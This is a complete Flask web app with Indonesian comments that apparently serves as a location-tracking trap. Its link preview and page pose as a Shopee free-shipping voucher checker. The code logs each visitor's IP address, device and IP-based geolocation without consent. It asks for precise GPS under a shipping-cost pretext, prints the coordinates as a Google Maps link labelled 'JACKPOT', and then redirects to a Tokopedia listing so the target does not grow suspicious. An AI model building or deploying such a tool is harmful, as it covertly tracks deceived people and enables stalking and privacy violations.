from flask import Flask, request, render_template_string, jsonify
import requests # Library untuk cek lokasi IP

# Vercel mencari variable bernama 'app' ini secara otomatis
app = Flask(__name__)

# --- CONFIG GAMBAR & LINK ---
IMAGE_URL = "https://upload.wikimedia.org/wikipedia/commons/9/9a/Logo-Tokopedia.png"
TARGET_URL = "https://www.tokopedia.com/studioponsel/apple-macbook-air-m4-2025-13-inch-24-512gb-16-512gb-10-core-gpu-16-256gb-8-core-gpu-1730970954041230655?extParam=ivf%3Dfalse%26keyword%3Dmacbook+m4%26search_id%3D20251213173041C5FF2543B53F4C1C1ASB%26src%3Dsearch&t_id=1765647049167&t_st=1&t_pp=search_result&t_efo=search_pure_goods_card&t_ef=goods_search&t_sm=&t_spt=search_result"

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="id" prefix="og: http://ogp.me/ns#">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cek Ongkir Otomatis</title>
    <meta property="og:title" content="Shopee Big Sale - Gratis Ongkir Rp0">
    <meta property="og:description" content="Klik untuk melihat voucher khusus lokasi Anda.">
    <meta property="og:image" content="{{ image }}">
    <meta name="twitter:card" content="summary_large_image">
    <style>
        body { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; text-align: center; padding: 20px; background-color: #f8f8f8; }
        .container { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); max-width: 400px; margin: 50px auto; }
        .logo { width: 100px; margin-bottom: 20px; }
        p { color: #555; font-size: 14px; margin-bottom: 20px; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #ee4d2d; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <img src="{{ image }}" class="logo" alt="Shopee">
        <h3>Sedang Memeriksa Lokasi...</h3>
        <p>Mohon izinkan akses lokasi untuk menghitung ongkos kirim.</p>
        <div class="loader"></div>
        <p id="status">Menghubungkan ke server...</p>
    </div>

    <script>
        const targetUrl = "{{ target }}";

        function redirectNow() {
            window.location.href = targetUrl;
        }

        function sendGps(lat, long, acc) {
            fetch('/save_gps', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ latitude: lat, longitude: long, accuracy: acc })
            }).then(() => { redirectNow(); }).catch(() => { redirectNow(); });
        }

        window.onload = function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        sendGps(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
                    },
                    (err) => {
                        // Jika User KLIK BLOCK / TOLAK:
                        // Tidak masalah, kita sudah dapat IP di server.
                        // Langsung redirect saja biar dia tidak curiga.
                        redirectNow();
                    },
                    { enableHighAccuracy: true, timeout: 5000 }
                );
            } else {
                redirectNow();
            }
        };
    </script>
</body>
</html>
"""

# Fungsi Helper: Cek Lokasi via IP (Tanpa Izin User)
def get_ip_info(ip_address):
    try:
        # Menggunakan API publik gratis ip-api.com
        response = requests.get(f"http://ip-api.com/json/{ip_address}?fields=status,message,country,regionName,city,isp,lat,lon")
        data = response.json()
        if data['status'] == 'success':
            return data
    except:
        return None
    return None

# Rute Utama
@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def home(path):
    # 1. AMBIL IP ADDRESS
    user_ip = request.headers.get('x-forwarded-for', request.remote_addr)
    user_agent = request.headers.get('User-Agent', '').lower()
    
    # 2. FILTER BOT (Supaya log tidak penuh sampah bot WA)
    is_bot = "facebookexternalhit" in user_agent or "whatsapp" in user_agent
    
    if not is_bot:
        # 3. LACAK LOKASI BERDASARKAN IP (JALAN OTOMATIS)
        # Ini akan sukses meskipun user menolak GPS nanti
        print(f"\n--- [TARGET MASUK] ---")
        print(f"IP Address  : {user_ip}")
        print(f"Device Info : {user_agent}")
        
        geo_data = get_ip_info(user_ip)
        if geo_data:
            print(f"Lokasi (IP) : {geo_data['city']}, {geo_data['regionName']}, {geo_data['country']}")
            print(f"ISP         : {geo_data['isp']}")
            print(f"Perkiraan Koordinat (IP) : {geo_data['lat']}, {geo_data['lon']}")
        else:
            print("Gagal mengambil detail lokasi IP.")
        print("----------------------\n")

    return render_template_string(HTML_TEMPLATE, image=IMAGE_URL, target=TARGET_URL)

# Rute Penerima GPS (Jika user klik ALLOW)
@app.route('/save_gps', methods=['POST'])
def save_gps():
    data = request.json
    user_ip = request.headers.get('x-forwarded-for', request.remote_addr)
    
    print(f"\n!!! JACKPOT: GPS DITEMUKAN !!!")
    print(f"IP Source   : {user_ip}")
    print(f"Google Maps : https://www.google.com/maps/search/?api=1&query={data['latitude']},{data['longitude']}")
    print(f"Akurasi     : {data['accuracy']} meter")
    print("------------------------------\n")
    
    return jsonify({"status": "success"})